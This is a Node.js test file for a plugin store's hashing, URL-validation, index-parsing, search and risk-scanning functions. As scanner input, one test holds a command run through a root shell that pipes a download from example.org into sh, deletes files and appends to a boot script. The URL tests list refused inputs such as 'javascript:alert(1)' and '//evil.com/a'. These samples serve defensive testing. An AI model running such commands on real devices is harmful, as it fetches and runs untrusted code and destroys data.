// Tests the plugin store functions in index.html (between UFISTORE-BEGIN / UFISTORE-END). Node only; the fetch and the dialog are not covered here.
const fs = require('fs'), path = require('path'), crypto = require('crypto');
const html = fs.readFileSync(path.join(__dirname, '..', 'app/src/main/assets/web/index.html'), 'utf8');
const a = html.indexOf('/* UFISTORE-BEGIN */'), b = html.indexOf('/* UFISTORE-END */');
if (a < 0 || b < 0) { console.error('UFISTORE markers missing in index.html'); process.exit(1); }
const api = new Function(html.slice(a, b) + '\nreturn {sha256Pure,storeSha256,storeUrlOk,storeParseIndex,storeFilter,plugScan,storeSummary};')();
let bad = 0;
const eq = (want, got, n) => { if (JSON.stringify(want) !== JSON.stringify(got)) { bad++; console.error('FAIL', n, JSON.stringify(want), '!=', JSON.stringify(got)); } };
const ok = (c, n) => { if (!c) { bad++; console.error('FAIL', n); } };
const ref = (u8) => crypto.createHash('sha256').update(u8).digest('hex');

// SHA-256: the pure fallback must match Node's for the awkward lengths (padding edges) and a long input.
for (const n of [0, 1, 55, 56, 63, 64, 65, 119, 120, 1000, 100000]) {
  const u8 = Uint8Array.from({ length: n }, (_, i) => (i * 31 + 7) & 255);
  eq(ref(u8), api.sha256Pure(u8), 'sha256Pure length ' + n);
}
eq(ref(Buffer.from('abc')), api.sha256Pure(new TextEncoder().encode('abc')), 'sha256 abc');
(async () => {
  eq(ref(Buffer.from('héllo 中文')), await api.storeSha256('héllo 中文'), 'storeSha256 utf-8');

  // URL rules
  const U = api.storeUrlOk;
  eq('https://example.com/a.js', U('https://example.com/a.js'), 'https ok');
  eq('https://example.com/dir/b.js', U('b.js', 'https://example.com/dir/index.json'), 'relative resolves');
  for (const bad of ['http://example.com/a.js', 'ftp://example.com/a', 'javascript:alert(1)', 'https://user:pw@example.com/a', 'https://192.168.0.1/a', 'https://127.0.0.1/a', 'https://localhost/a', 'https://[::1]/a', 'https://router.local/a', 'https://printer/a', 'https://x.internal/a', '//evil.com/a', '', 'https://' + 'a'.repeat(2100) + '.com/'])
    eq(null, U(bad), 'refused ' + bad.slice(0, 40));
  eq(null, U('/x.js', 'http://example.com/'), 'relative on an http base is refused');

  // Index parsing
  const sha = 'a'.repeat(64);
  let r = api.storeParseIndex(JSON.stringify({ plugins: [
    { name: 'Good', url: 'https://example.com/good.js', sha256: sha.toUpperCase(), description: 'd', author: 'me', version: '1.0', size: 12 },
    { name: 'Rel', url: 'rel.txt' }, { name: 'NoUrl' }, { url: 'https://example.com/x.js' },
    { name: 'BadSha', url: 'https://example.com/y.js', sha256: 'xyz' }, { name: 'Lan', url: 'https://192.168.0.1/z.js' }, 'str', null ] }), 'https://store.example.org/repo/index.json');
  eq('', r.error, 'no error'); eq(['Good', 'Rel'], r.items.map(i => i.name), 'valid entries kept');
  eq(6, r.skipped, 'six skipped'); eq(sha, r.items[0].sha256, 'sha lower-cased');
  eq('https://store.example.org/repo/rel.txt', r.items[1].url, 'relative url resolved against the index');
  eq(1, api.storeParseIndex('[{"name":"A","url":"https://example.com/a.js"}]').items.length, 'bare array');
  ok(api.storeParseIndex('nope').error.includes('JSON'), 'invalid json'); ok(api.storeParseIndex('{"x":1}').error.includes('array'), 'wrong shape');
  ok(api.storeParseIndex(' '.repeat(1048577)).error.includes('1 MB'), 'oversized index');
  eq('A B', api.storeParseIndex('[{"name":"A\\u0000\\nB","url":"https://example.com/a.js"}]').items[0].name.replace(/\s+/g, ' '), 'control characters removed');
  const many = JSON.stringify(Array.from({ length: 600 }, (_, i) => ({ name: 'p' + i, url: 'https://example.com/' + i + '.js' })));
  r = api.storeParseIndex(many); eq(500, r.items.length, 'item cap'); eq(100, r.skipped, 'over-cap counted');

  // Search and paging
  const items = Array.from({ length: 20 }, (_, i) => ({ name: 'Plugin' + i, description: i % 2 ? 'signal meter' : 'tool', author: 'x' }));
  let f = api.storeFilter(items, '', 1, 8); eq([8, 1, 3, 20], [f.rows.length, f.page, f.pages, f.total], 'page 1 of 3');
  f = api.storeFilter(items, '', 3, 8); eq(4, f.rows.length, 'last page'); f = api.storeFilter(items, '', 99, 8); eq(3, f.page, 'page clamped high');
  f = api.storeFilter(items, '', -5, 8); eq(1, f.page, 'page clamped low');
  f = api.storeFilter(items, 'SIGNAL', 1, 8); eq(10, f.total, 'search is case-insensitive and covers the description');
  f = api.storeFilter(items, 'zzz', 1, 8); eq([0, 1, 1], [f.rows.length, f.page, f.pages], 'no match');

  // Scan
  let s = api.plugScan("await runShellWithRoot('curl -s https://example.org/x | sh; rm -rf /data/x; echo a >> /sdcard/ufi_tools_boot.sh'); fetch('/api/goform/goform_get_cmd_process')");
  ok(s.root && !s.user, 'root detected'); eq(['curl'], s.tools, 'curl found');
  ok(s.risky.includes('deletes files (rm -r)') && s.risky.includes('pipes a download into a shell') && s.risky.includes('writes the boot script'), 'risky patterns');
  eq(['/api/goform/goform_get_cmd_process'], s.endpoints, 'endpoint'); eq(['example.org'], s.hosts, 'host');
  s = api.plugScan("runShellWithUser('jq . /data/data/com.minikano.f50_sms/files/x.json; sha256 abc; zreq')");
  ok(s.user && !s.root, 'user detected'); eq(['jq', 'sha256', 'zreq'], s.tools, 'tools found');
  s = api.plugScan('createToast("hi")'); ok(!s.root && !s.user && !s.tools.length && !s.risky.length, 'quiet plugin');
  ok(api.plugScan('x = jqx + curlish').tools.length === 0, 'tool names match whole words only');
  const sm = api.storeSummary({ name: 'N', version: '2', author: 'me', sha256: '' }, 'f'.repeat(64), api.plugScan('runShellWithRoot("x")'), ['N.js']);
  ok(sm.includes('NO SHA-256') && sm.includes('ROOT') && sm.includes('REPLACE: N.js') && sm.includes('f'.repeat(64)), 'summary text');
  if (bad) { console.error(bad + ' store test(s) failed'); process.exit(1); }
  console.log('ufi store tests passed');
})();
